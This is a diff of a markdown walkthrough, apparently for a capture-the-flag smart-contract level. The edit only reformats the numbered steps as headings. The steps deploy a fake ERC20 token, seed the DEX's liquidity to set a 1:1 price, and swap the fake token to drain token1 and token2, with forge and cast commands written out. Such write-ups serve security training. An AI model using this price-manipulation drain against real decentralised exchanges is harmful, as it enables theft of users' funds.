@@ -66,7 +66,7 @@ The price is calculated based on the ratio of tokenA and tokenB. If we createa a
 
 ### Walkthrough
 
-1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
+##### 1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
@@ -80,25 +80,25 @@ contract MaliciousToken is ERC20 {
 }
 ```
 
-2. deploy our new contract
+##### 2. deploy our new contract
 ```console
 forge create src/Contract.sol:MaliciousToken --private-key  $PRIVATE_KEY
 ```
 
-3. approve the Dex contract to spend our tokens. We need to do this to add liquidity
+##### 3. approve the Dex contract to spend our tokens. We need to do this to add liquidity
 ```console
 cast send $DEPLOYED_ADDRESS "approve(address,uint256)" $LEVEL_ADDRESS 200 --private-key=$PRIVATE_KEY 
 ```
 > Replace $DEPLOYED_ADDRESS with the address of your deployed contract
 
-4. send 100 of our `MALTKN` to the dex so that the price ratio between `token1` and `MALTKN` is 1:1
+##### 4. send 100 of our `MALTKN` to the dex so that the price ratio between `token1` and `MALTKN` is 1:1
 ```console
 cast send $LEVEL_ADDRESS "add_liquidity(address,uint)" $DEPLOYED_ADDRESS 100 --gas 150000 \ 
 --private-key $PRIVATE_KEY
 ```
 
 
-5. let's get the addresses for `token1` and `token2`
+##### 5. let's get the addresses for `token1` and `token2`
  
 ```console
 cast call $LEVEL_ADDRESS "token1()"
@@ -106,14 +106,14 @@ cast call $LEVEL_ADDRESS "token1()"
 cast call $LEVEL_ADDRESS "token2()"
 ```
 
-6. now that the exchange rate is 1:1, let's send swap 100 of our malicious token to `token1` to drain the dex's supply of `token1`.
+##### 6. now that the exchange rate is 1:1, let's send swap 100 of our malicious token to `token1` to drain the dex's supply of `token1`.
  
 ```console
 cast send $LEVEL_ADDRESS "swap(address,address,uint)" $DEPLOYED_ADDRESS $TOKEN1_ADDRESS 100 --gas 250000 \
 --private-key $PRIVATE_KEY
 ```
 
-7. now the total supply of `MALTKN` in the contract is 200, meaning that the ratio between `MALTKN` and `token2` will be 0.5:1 
+##### 7. now the total supply of `MALTKN` in the contract is 200, meaning that the ratio between `MALTKN` and `token2` will be 0.5:1 
  
 to drain the supply of `token2` we need to swap 200 `MALTKN` for `token2`
 ```console
